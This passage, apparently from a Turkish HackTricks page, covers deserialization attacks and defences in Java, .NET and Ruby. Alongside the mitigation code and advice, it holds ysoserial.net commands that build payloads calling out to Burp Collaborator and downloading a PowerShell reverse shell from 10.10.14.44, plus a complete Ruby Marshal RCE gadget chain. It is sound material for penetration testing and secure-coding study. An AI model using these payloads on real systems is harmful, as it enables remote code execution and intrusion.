Serileştirmeyi yalnızca izin verilen sınırlarla sınırlamak için **`resolveClass()`** yöntemini geçersiz kılın. Bu, serileştirmeyi yalnızca açıkça izin verilen sınıflar dışında herhangi bir sınıfın serileştirilmesini engeller. Aşağıdaki örnekte olduğu gibi serileştirmeyi yalnızca `Bicycle` sınırlarına kısıtlayan bir örneği kısıtlar:
```java
// Code from https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
public class LookAheadObjectInputStream extends ObjectInputStream {

public LookAheadObjectInputStream(InputStream inputStream) throws IOException {
super(inputStream);
}

/**
* Only deserialize instances of our expected Bicycle class
*/
@Override
protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
if (!desc.getName().equals(Bicycle.class.getName())) {
throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
}
return super.resolveClass(desc);
}
}
```
**Güvenlik Geliştirmesi için Bir Java Ajanı Kullanımı**, kod değişikliği mümkün olmadığında bir yedek çözüm sunar. Bu yöntem genellikle **zararlı sınıfları karalistelemek** için bir JVM parametresi kullanır:
```
-javaagent:name-of-agent.jar
```
Deserilizasyonu dinamik olarak güvence altına almanın bir yolunu sağlar, anında kod değişikliklerinin pratik olmadığı ortamlar için idealdir.

[rO0 by Contrast Security](https://github.com/Contrast-Security-OSS/contrast-rO0) içindeki bir örneği kontrol edin.

**Serileştirme Filtreleri Uygulamak**: Java 9, **`ObjectInputFilter`** arayüzü aracılığıyla serileştirme filtrelerini tanıttı ve serileştirilmiş nesnelerin serileştirilmeden önce karşılaması gereken kriterleri belirlemek için güçlü bir mekanizma sağlar. Bu filtreler genel olarak veya her akış için uygulanabilir, serileştirme işlemi üzerinde granüler bir kontrol sunar.

Serileştirme filtrelerinden yararlanmak için tüm serileştirme işlemlerine uygulanan genel bir filtre ayarlayabilir veya belirli akışlar için dinamik olarak yapılandırabilirsiniz. Örneğin:
```java
ObjectInputFilter filter = info -> {
if (info.depth() > MAX_DEPTH) return Status.REJECTED; // Limit object graph depth
if (info.references() > MAX_REFERENCES) return Status.REJECTED; // Limit references
if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
return Status.REJECTED; // Restrict to allowed classes
}
return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```
**Geliştirilmiş Güvenlik İçin Harici Kütüphanelerden Yararlanma**: **NotSoSerial**, **jdeserialize** ve **Kryo** gibi kütüphaneler, Java deserializasyonunu kontrol etmek ve izlemek için gelişmiş özellikler sunar. Bu kütüphaneler, sınıfları beyaz listeye alma veya siyah listeye alma, deserializasyondan önce serileştirilmiş nesneleri analiz etme ve özel serileştirme stratejileri uygulama gibi ek güvenlik katmanları sağlayabilir.

* **NotSoSerial**, güvensiz kodların yürütülmesini önlemek için deserializasyon süreçlerini engeller.
* **jdeserialize**, serileştirilmiş Java nesnelerinin deserialize edilmeden analiz edilmesine izin verir ve potansiyel olarak kötü amaçlı içeriği belirlemeye yardımcı olur.
* **Kryo**, hız ve verimliliği vurgulayan alternatif bir serileştirme çerçevesidir ve güvenliği artırabilecek yapılandırılabilir serileştirme stratejileri sunar.

### Referanslar

* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html)
* Deserializasyon ve ysoserial konuşması: [http://frohoff.github.io/appseccali-marshalling-pickles/](http://frohoff.github.io/appseccali-marshalling-pickles/)
* [https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/](https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/)
* [https://www.youtube.com/watch?v=VviY3O-euVQ](https://www.youtube.com/watch?v=VviY3O-euVQ)
* Gadgetinspector hakkında konuşma: [https://www.youtube.com/watch?v=wPbW6zQ52w8](https://www.youtube.com/watch?v=wPbW6zQ52w8) ve slaytlar: [https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf](https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains.pdf)
* Marshalsec makalesi: [https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true](https://www.github.com/mbechler/marshalsec/blob/master/marshalsec.pdf?raw=true)
* [https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr](https://dzone.com/articles/why-runtime-compartmentalization-is-the-most-compr)
* [https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)
* [https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html](https://deadcode.me/blog/2016/09/18/Blind-Java-Deserialization-Part-II.html)
* Java ve .Net JSON deserializasyon **makalesi:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** konuşma: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) ve slaytlar: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* Deserializasyon CVE'leri: [https://paper.seebug.org/123/](https://paper.seebug.org/123/)

## JNDI Enjeksiyonu ve log4Shell

**JNDI Enjeksiyonu**'nun ne olduğunu, RMI, CORBA ve LDAP aracılığıyla nasıl kötüye kullanılabileceğini ve **log4shell**'in nasıl sömürüleceğini (bu zafiyetin bir örneği) aşağıdaki sayfada bulabilirsiniz:

{% content-ref url="jndi-java-naming-and-directory-interface-and-log4shell.md" %}
[jndi-java-naming-and-directory-interface-and-log4shell.md](jndi-java-naming-and-directory-interface-and-log4shell.md)
{% endcontent-ref %}

## JMS - Java Message Service

> **Java Message Service** (**JMS**) API, iki veya daha fazla istemci arasında mesaj göndermek için Java mesaj odaklı bir orta yazılım API'sidir. Üretici-tüketici sorununu ele almak için bir uygulamadır. JMS, Java Platform, Enterprise Edition (Java EE) bir parçasıdır ve Sun Microsystems tarafından geliştirilen ancak daha sonra Java Community Process tarafından yönlendirilen bir spesifikasyonla tanımlanmıştır. Java EE'ye dayalı uygulama bileşenlerinin mesaj oluşturmasına, göndermesine, almasına ve okumasına izin veren bir mesajlaşma standardıdır. Dağıtılmış bir uygulamanın farklı bileşenleri arasındaki iletişimin gevşek bağlı, güvenilir ve asenkron olmasına olanak tanır. (Kaynak: [Vikipedi](https://en.wikipedia.org/wiki/Java\_Message\_Service)).

### Ürünler

Bu orta yazılımı mesaj göndermek için kullanan birkaç ürün bulunmaktadır:

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (314).png>)

![https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](<../../.gitbook/assets/image (1056).png>)

### Sömürü

Yani, temelde **birçok hizmet JMS'yi tehlikeli bir şekilde kullanıyor**. Bu nedenle, bu hizmetlere mesaj gönderme yetkiniz varsa (genellikle geçerli kimlik bilgilerine ihtiyacınız olacaktır) **serileştirilmiş kötü amaçlı nesneler gönderebilir ve bunlar tüketici/abone tarafından desirileştirilebilir**.\
Bu, bu sömürüde **mesajı kullanacak tüm istemcilerin enfekte olacağı** anlamına gelir.

Bir hizmetin zafiyetli olmasına rağmen (çünkü kullanıcı girdisini güvensiz bir şekilde desirileştiriyor olabilir) yine de zafiyeti sömürmek için geçerli araçlar bulmanız gerekeceğini unutmayın.

[JMET](https://github.com/matthiaskaiser/jmet) aracı, **bilinen araçlar kullanarak serileştirilmiş birkaç kötü amaçlı nesne göndererek bu hizmetlere bağlanıp saldırı düzenlemek için oluşturulmuştur**. Bu saldırılar, hizmet hala zafiyetli ise ve kullanılan araçlardan herhangi biri zafiyetli uygulamanın içindeyse çalışacaktır.

### Referanslar

* JMET konuşması: [https://www.youtube.com/watch?v=0h8DWiOWGGA](https://www.youtube.com/watch?v=0h8DWiOWGGA)
* Slaytlar: [https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Kaiser-Pwning-Your-Java-Messaging-With-Deserialization-Vulnerabilities.pdf)

## .Net

.Net bağlamında, deserializasyon saldırıları, nesnenin deserializasyonu sırasında belirli kodları çalıştırmak için kullanılan araçlar bulunan Java'da bulunanlarla benzer bir şekilde çalışır.
### Parmak İzi

#### WhiteBox

Kaynak kodu, aşağıdaki öğelerin varlığı açısından incelenmelidir:

1. `TypeNameHandling`
2. `JavaScriptTypeResolver`

Odak, türün kullanıcı tarafından kontrol edilen bir değişken tarafından belirlenmesine izin veren serileştiricilerde olmalıdır.

#### BlackBox

Arama, sunucu tarafında deserialize edilebilecek tür üzerinde kontrol sağlayan **AAEAAAD/////** veya benzer bir deserialization geçirebilecek deserialization hedeflemelidir. Bu, ancak bununla sınırlı olmamak kaydıyla, `TypeObject` veya `$type` içeren **JSON** veya **XML** yapılarını içerebilir.

### ysoserial.net

Bu durumda, **deserialization saldırılarını oluşturmak için** aracı [**ysoserial.net**](https://github.com/pwntester/ysoserial.net) kullanabilirsiniz. Git deposunu indirdikten sonra örneğin Visual Studio kullanarak aracı **derlemeniz gerekmektedir**.

**ysoserial.net**'in **nasıl exploit oluşturduğunu öğrenmek istiyorsanız**, [**ObjectDataProvider gadget + ExpandedWrapper + Json.Net biçimleyiciyi açıklayan bu sayfayı kontrol edebilirsiniz**](basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.md).

**ysoserial.net**'in ana seçenekleri: **`--gadget`**, **`--formatter`**, **`--output`** ve **`--plugin`**'dir.

* **`--gadget`**, deserialize sırasında komutları yürütmek için kötüye kullanılacak sınıf/fonksiyonu belirtmek için kullanılır.
* **`--formatter`**, exploit'i serileştirmek için kullanılan yöntemi belirtir (payload'un deserialize edilmesinde back-end'in hangi kütüphaneyi kullandığını bilmeli ve aynısını kullanmalısınız).
* **`--output`**, exploit'in **raw** veya **base64** kodlanmış olup olmadığını belirtmek için kullanılır. _Not olarak, **ysoserial.net** payload'u **UTF-16LE** ile kodlayacaktır (Windows'ta varsayılan olarak kullanılan kodlama) bu nedenle raw alırsanız ve sadece bir linux konsolundan kodlarsanız, exploit'in düzgün çalışmasını engelleyecek bazı **kodlama uyumluluk sorunları** olabilir (HTB JSON kutusunda payload hem UTF-16LE hem de ASCII'de çalıştı ancak bu her zaman çalışacağı anlamına gelmez)._
* **`--plugin`**, ysoserial.net, ViewState gibi **belirli çerçeveler için exploit oluşturmak için eklentileri destekler**.

#### Daha fazla ysoserial.net parametresi

* `--minify`, **daha küçük bir payload** sağlar (mümkünse)
* `--raf -f Json.Net -c "anything"` Bu, belirtilen bir biçimleyiciyle (`Json.Net` bu durumda) kullanılabilecek tüm gadget'ları belirtecektir.
* `--sf xml`, bir gadget (`-g`) belirtebilir ve ysoserial.net "xml" içeren biçimleyicileri arayacaktır (büyük/küçük harf duyarlı değildir).

**ysoserial örnekleri** exploit oluşturmak için:
```bash
#Send ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

#Timing
#I tried using ping and timeout but there wasn't any difference in the response timing from the web server

#DNS/HTTP request
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup sb7jkgm6onw1ymw0867mzm2r0i68ux.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://rfaqfsze4tl7hhkt5jtp53a1fsli97.burpcollaborator.net/a a" -o base64

#Reverse shell
#Create shell command in linux
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv  -t UTF-16LE | base64 -w0
#Create exploit using the created B64 shellcode
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADQANAAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=" -o base64
```
**ysoserial.net**'in her bir açığı nasıl çalıştığını daha iyi anlamanıza yardımcı olan **çok ilginç bir parametresi** de bulunmaktadır: `--test`\
Bu parametreyi belirtirseniz, **ysoserial.net** açığı **yerel olarak deneyecek**, böylece yükünüzün doğru bir şekilde çalışıp çalışmadığını test edebilirsiniz.\
Bu parametre faydalıdır çünkü kodu incelediğinizde aşağıdaki gibi kod parçaları bulacaksınız ([ObjectDataProviderGenerator.cs](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Generators/ObjectDataProviderGenerator.cs#L208)):
```java
if (inputArgs.Test)
{
try
{
SerializersHelper.JsonNet_deserialize(payload);
}
catch (Exception err)
{
Debugging.ShowErrors(inputArgs, err);
}
}
```
Bu, saldırıyı test etmek için kodun [serializersHelper.JsonNet\_deserialize](https://github.com/pwntester/ysoserial.net/blob/c53bd83a45fb17eae60ecc82f7147b5c04b07e42/ysoserial/Helpers/SerializersHelper.cs#L539) işlevini çağıracağı anlamına gelir.
```java
public static object JsonNet_deserialize(string str)
{
Object obj = JsonConvert.DeserializeObject<Object>(str, new JsonSerializerSettings
{
TypeNameHandling = TypeNameHandling.Auto
});
return obj;
}
```
**Önceki kod, oluşturulan saldırıya karşı savunmasızdır**. Dolayısıyla, bir .Net uygulamasında benzer bir şey bulursanız, muhtemelen o uygulama da savunmasızdır.\
Bu nedenle, **`--test`** parametresi, **ysoserial.net**'in oluşturabileceği deserialization saldırısına karşı savunmasız olan kod parçalarını anlamamıza olanak tanır.

### ViewState

[**.Net'in \_\_ViewState parametresini nasıl sömürmeye çalışacağınız hakkında bu POST'a**](exploiting-\_\_viewstate-parameter.md) **bakın** ve **keyfi kod yürütmek için**. Eğer **kurban makinenin kullandığı sırları zaten biliyorsanız**, [**bu yazıyı okuyun ve kod yürütmek için**](exploiting-\_\_viewstate-knowing-the-secret.md)** bilgi edinin**.

### Önleme

.Net'te deserialization ile ilişkili riskleri azaltmak için:

* **Veri akışlarının kendi nesne türlerini tanımlamasına izin vermeyin.** Mümkün olduğunda `DataContractSerializer` veya `XmlSerializer` kullanın.
* **`JSON.Net` için, `TypeNameHandling`'i `None` olarak ayarlayın:** %%%TypeNameHandling = TypeNameHandling.None%%%
* **`JavaScriptSerializer`'ı `JavaScriptTypeResolver` ile kullanmaktan kaçının.**
* **Deserialization yapılabilen türleri sınırlayın**, .Net türleri ile ilişkili doğal riskleri anlayarak, sunucu dosyalarının özelliklerini değiştirebilen `System.IO.FileInfo` gibi türlerden kaynaklanan hizmet reddi saldırılarına yol açabilecek potansiyel riskleri anlayın.
* **Riskli özelliklere sahip türlerle dikkatli olun**, `Value` özelliği ile istismar edilebilen `System.ComponentModel.DataAnnotations.ValidationException` gibi türlerle.
* **Saldırganların deserialization sürecini etkilemesini önlemek için tür oluşturmayı güvenli bir şekilde kontrol edin**, hatta `DataContractSerializer` veya `XmlSerializer` bile savunmasız hale getirebilir.
* **`BinaryFormatter` ve `JSON.Net` için özel bir `SerializationBinder` kullanarak beyaz liste kontrolleri uygulayın.**
* **.Net içindeki bilinen güvensiz deserialization araçları hakkında bilgi sahibi olun** ve deserializer'ların bu türleri örneklememesini sağlayın.
* **Potansiyel olarak riskli kodu**, WPF uygulamalarında `System.Windows.Data.ObjectDataProvider` gibi bilinen araçları, güvenilmeyen veri kaynaklarına maruz kalmamak için internet erişimine sahip olmayan kodlardan izole edin.

### **Referanslar**

* Java ve .Net JSON deserialization **makalesi:** [**https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf**](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf)**,** sunum: [https://www.youtube.com/watch?v=oUAeWhW5b8c](https://www.youtube.com/watch?v=oUAeWhW5b8c) ve slaytlar: [https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf](https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf)
* [https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization\_Cheat\_Sheet.html#net-csharp)
* [https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf](https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH\_US\_12\_Forshaw\_Are\_You\_My\_Type\_WP.pdf)
* [https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization](https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization)

## **Ruby**

Ruby'de, seri hale getirme işlemi **marshal** kütüphanesindeki iki yöntemle kolaylaştırılır. İlk yöntem olan **dump**, bir nesneyi bir bayt akışına dönüştürmek için kullanılır. Bu işlem seri hale getirme olarak adlandırılır. Buna karşılık, ikinci yöntem olan **load**, bir bayt akışını bir nesneye geri dönüştürmek için kullanılır, bu işlem deserialization olarak adlandırılır.

Seri hale getirilmiş nesneleri güvence altına almak için **Ruby, HMAC (Hash-Based Message Authentication Code)** kullanır ve verinin bütünlüğünü ve doğruluğunu sağlar. Bu amaçla kullanılan anahtar, şu olası konumlardan birinde saklanır:

* `config/environment.rb`
* `config/initializers/secret_token.rb`
* `config/secrets.yml`
* `/proc/self/environ`

**Ruby 2.X genel deserialization için RCE gadget zinciri (daha fazla bilgi için** [**https://www.elttam.com/blog/ruby-deserialization/**](https://www.elttam.com/blog/ruby-deserialization/)**)**:
```ruby
#!/usr/bin/env ruby

# Code from https://www.elttam.com/blog/ruby-deserialization/

class Gem::StubSpecification
def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")#RCE cmd must start with "|" and end with "1>&2"

puts "STEP n"
stub_specification.name rescue nil
puts


class Gem::Source::SpecificFile
def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

puts "STEP n-1"
specific_file <=> other_specific_file rescue nil
puts


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

puts "STEP n-2"
$dependency_list.each{} rescue nil
puts


class Gem::Requirement
def marshal_dump
[$dependency_list]
end
end

payload = Marshal.dump(Gem::Requirement.new)

puts "STEP n-3"
Marshal.load(payload) rescue nil
puts


puts "VALIDATION (in fresh ruby process):"
IO.popen("ruby -e 'Marshal.load(STDIN.read) rescue nil'", "r+") do |pipe|
pipe.print payload
pipe.close_write
puts pipe.gets
puts
end

puts "Payload (hex):"
puts payload.unpack('H*')[0]
puts


require "base64"
puts "Payload (Base64 encoded):"
puts Base64.encode64(payload)
```
Diğer RCE zinciri Ruby On Rails'ı sömürmek için: [https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/](https://codeclimate.com/blog/rails-remote-code-execution-vulnerability-explained/)

### Ruby .send() yöntemi

[**Bu zafiyet raporunda**](https://starlabs.sg/blog/2024/04-sending-myself-github-com-environment-variables-and-ghes-shell/) açıklandığı gibi, eğer bazı kullanıcı denetlenmemiş girdiler bir ruby nesnesinin `.send()` yöntemine ulaşırsa, bu yöntem nesnenin **herhangi başka bir yöntemini** herhangi bir parametre ile çağırmayı sağlar.

Örneğin, eval'i çağırmak ve ardından ikinci parametre olarak ruby kodunu çağırmak, keyfi kodu yürütmenize olanak tanır:
```ruby
<Object>.send('eval', '<user input with Ruby code>') == RCE
```
{% endcode %}

Ayrıca, yalnızca **`.send()`**'in bir parametresinin saldırgan tarafından kontrol edildiği durumda, önceki açıklamada belirtildiği gibi, **argümanlara ihtiyaç duymayan veya argümanlarına** **varsayılan değerler** olan herhangi bir nesnenin yöntemini çağırmak mümkündür.\
Bunun için, nesnenin tüm yöntemlerini numaralandırmak ve **bu gereksinimleri karşılayan bazı ilginç yöntemleri bulmak mümkündür**.

{% code overflow="wrap" %}
```ruby
<Object>.send('<user_input>')

# This code is taken from the original blog post
# <Object> in this case is Repository
## Find methods with those requirements
repo = Repository.find(1)  # get first repo
repo_methods = [           # get names of all methods accessible by Repository object
repo.public_methods(),
repo.private_methods(),
repo.protected_methods(),
].flatten()

repo_methods.length()      # Initial number of methods => 5542

## Filter by the arguments requirements
candidate_methods = repo_methods.select() do |method_name|
[0, -1].include?(repo.method(method_name).arity())
end
candidate_methods.length() # Final number of methods=> 3595
```
{% endcode %}

<details>

<summary><strong>Sıfırdan kahramana kadar AWS hacklemeyi öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>
